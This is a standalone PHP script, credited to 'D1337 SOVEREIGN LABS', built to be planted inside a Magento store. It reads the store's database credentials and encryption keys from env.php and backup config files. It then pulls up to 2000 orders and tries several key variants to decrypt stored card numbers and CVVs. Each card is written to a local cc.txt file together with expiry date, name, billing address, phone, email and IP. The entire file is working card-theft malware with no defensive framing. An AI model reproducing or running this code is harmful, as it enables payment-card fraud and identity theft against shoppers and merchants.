<?php
/**
 * Magento 2 Universal Decryptor - STANDALONE VERSION (No Bootstrap)
 * Bypasses "cache_dir not writable" errors by avoiding Magento Framework initialization.
 * D1337 SOVEREIGN LABS
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('memory_limit', '512M');

echo "Starting Standalone Decrypt Script...\n";

// ============================================
// 1. CONFIG LOAD (No Bootstrap)
// ============================================
function findEnvPhp() {
    $roots = [
        dirname(__FILE__) . '/../../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../../app/etc/env.php',
        dirname(__FILE__) . '/../../../app/etc/env.php',
        dirname(__FILE__) . '/../../app/etc/env.php',
        dirname(__FILE__) . '/../app/etc/env.php',
        dirname(__FILE__) . '/app/etc/env.php',
        $_SERVER['DOCUMENT_ROOT'] . '/app/etc/env.php'
    ];
    foreach ($roots as $file) {
        if (file_exists($file)) return realpath($file);
    }
    return null;
}

$envFile = findEnvPhp();
if (!$envFile) die("Error: app/etc/env.php not found.\n");

echo "Found Config: $envFile\n";
$env = include $envFile;

if (!isset($env['db']['connection']['default'])) {
    die("Error: Database configuration not found in env.php\n");
}

// Extract DB Creds
$dbConf = $env['db']['connection']['default'];
$host = $dbConf['host'] ?? 'localhost';
$user = $dbConf['username'] ?? '';
$pass = $dbConf['password'] ?? '';
$dbname = $dbConf['dbname'] ?? '';
$prefix = $env['db']['table_prefix'] ?? '';

// Extract Keys
$keys = [];
if (isset($env['crypt']['key'])) $keys[] = $env['crypt']['key'];

// Scan for other keys in backups
$dir = dirname($envFile);
foreach (glob($dir . '/env*.php*') as $f) {
    if ($f == $envFile) continue;
    $c = file_get_contents($f);
    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
}
// Legacy M1
$m1 = $dir . '/local.xml';
if (file_exists($m1)) {
    $x = @simplexml_load_file($m1);
    if ($x && isset($x->global->crypt->key)) $keys[] = (string)$x->global->crypt->key;
}
$keys = array_unique($keys);
echo "Loaded " . count($keys) . " keys.\n";

// ============================================
// 2. DATABASE CONNECTION (PDO)
// ============================================
try {
    $dsn = "mysql:host=$host;dbname=$dbname;charset=utf8";
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
    echo "DB Connected.\n";
} catch (PDOException $e) {
    die("DB Connection Failed: " . $e->getMessage() . "\n");
}

// ============================================
// 3. DECRYPTION LOGIC (Standalone)
// ============================================
// Polyfills/Constants for Standalone
if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBOX_KEYBYTES', 32);
if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);

function standalone_sodium_decrypt($encrypted_full, $key) {
    if (!function_exists('sodium_crypto_secretbox_open')) return false;
    
    // Format: 0:3:BASE64_PAYLOAD
    $parts = explode(':', $encrypted_full);
    if (count($parts) < 3) return false;
    
    $payload = base64_decode(end($parts));
    if (!$payload || strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;

    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    
    // Try key variations
    $candidates = [
        $key, 
        md5($key), 
        substr($key, 0, 32)
    ];
    if (strlen($key) == 64 && ctype_xdigit($key)) $candidates[] = hex2bin($key);

    foreach ($candidates as $k) {
        if (strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
        try {
            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
            if ($pt !== false) return $pt;
        } catch (Exception $e) {}
    }
    return false;
}

function standalone_mcrypt_decrypt($value, $key) {
    if (!function_exists('mcrypt_decrypt')) return false;
    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
    return rtrim($pt, "\0");
}

function smart_decrypt($value, $keys) {
    if (!$value) return '';
    
    foreach ($keys as $k) {
        // Sodium (M2 v3)
        if (strpos($value, ':3:') !== false) {
            $pt = standalone_sodium_decrypt($value, $k);
            if ($pt && preg_match('/^\d{13,19}$/', $pt)) return $pt;
        }
        // Mcrypt (M1 or M2 v1/v2)
        if (strpos($value, ':') === false) {
            $pt = standalone_mcrypt_decrypt($value, $k);
            if ($pt && preg_match('/^\d{13,19}$/', $pt)) return $pt;
        }
    }
    
    // If no decrypt, return raw (stripped of wrapper if possible)
    return $value;
}

// ============================================
// 4. EXTRACTION
// ============================================
$tbl_payment = $prefix . 'sales_order_payment';
$tbl_order = $prefix . 'sales_order';
$tbl_addr = $prefix . 'sales_order_address';

$sql = "
SELECT
    so.increment_id AS order_number,
    so.created_at   AS order_date,
    sop.method      AS payment_method,
    sop.cc_number_enc,
    sop.additional_information,
    sop.cc_cid_enc,
    sop.cc_exp_month,
    sop.cc_exp_year,
    ba.firstname,
    ba.lastname,
    ba.street,
    ba.city,
    ba.region,
    ba.postcode AS zip,
    ba.country_id AS country,
    ba.telephone AS phone,
    so.customer_email,
    so.remote_ip
FROM {$tbl_payment} sop
JOIN {$tbl_order} so ON so.entity_id = sop.parent_id
LEFT JOIN {$tbl_addr} ba ON ba.parent_id = so.entity_id AND ba.address_type = 'billing'
WHERE (sop.cc_number_enc IS NOT NULL AND sop.cc_number_enc != '')
   OR (sop.additional_information LIKE '%cc_number_enc%')
ORDER BY so.created_at DESC
LIMIT 2000
";

echo "Executing Query...\n";
try {
    $stmt = $pdo->query($sql);
    $rows = $stmt->fetchAll();
    echo "Found " . count($rows) . " rows.\n";
} catch (PDOException $e) {
    die("Query Failed: " . $e->getMessage() . "\n");
}

$outFile = __DIR__ . '/cc.txt';
$fp = fopen($outFile, 'w');
$count = 0;

foreach ($rows as $r) {
    // Extract Encrypted PAN
    $enc = $r['cc_number_enc'];
    if (!$enc && $r['additional_information']) {
        $info = json_decode($r['additional_information'], true);
        $enc = $info['cc_number_enc'] ?? '';
    }
    
    // Extract Encrypted CVV
    $cvv_enc = $r['cc_cid_enc'];
    if (!$cvv_enc && $r['additional_information']) {
        $info = json_decode($r['additional_information'], true);
        $cvv_enc = $info['cc_cid_enc'] ?? '';
    }

    $pan = smart_decrypt($enc, $keys);
    $cvv = smart_decrypt($cvv_enc, $keys);

    if (preg_match('/^\d{13,19}$/', $pan)) $count++;

    $line = "ORDER={$r['order_number']} | " .
            "DATE={$r['order_date']} | " .
            "METHOD={$r['payment_method']} | " .
            "PAN={$pan} | " .
            "CVV={$cvv} | " .
            "EXP={$r['cc_exp_month']}/{$r['cc_exp_year']} | " .
            "NAME={$r['firstname']} {$r['lastname']} | " .
            "ADDRESS=" . str_replace(["\n","\r"], ' ', (string)$r['street']) . " | " .
            "CITY={$r['city']} | " .
            "STATE={$r['region']} | " .
            "ZIP={$r['zip']} | " .
            "COUNTRY={$r['country']} | " .
            "PHONE={$r['phone']} | " .
            "EMAIL={$r['customer_email']} | " .
            "IP={$r['remote_ip']}";
            
    fwrite($fp, $line . PHP_EOL);
}
fclose($fp);

echo "DONE. Written to $outFile\n";
echo "Stats: Extracted " . count($rows) . " rows. Successfully decrypted $count PANs.\n";
?>
